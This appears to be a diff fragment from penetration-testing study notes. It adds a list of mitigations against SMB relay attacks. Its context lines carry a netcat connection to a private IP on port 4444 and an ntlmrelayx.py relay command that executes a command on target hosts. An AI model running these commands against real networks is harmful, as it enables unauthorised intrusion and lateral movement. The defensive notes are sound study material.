@@ -97,3 +97,9 @@ nc 192.168.0.30 4444
 
 ntlmrelayx.py -tf targets.txt -smb2support -c "command"
 
+Mitigation strategies SMB Relay
+- enable SMB signing (but worse performance) 100%
+- disable NTLM authentication 100% but Kerberos stops, default NTLM
+- limit dimain admin scope
+- local admin restriction (+ service desk tickets)
+
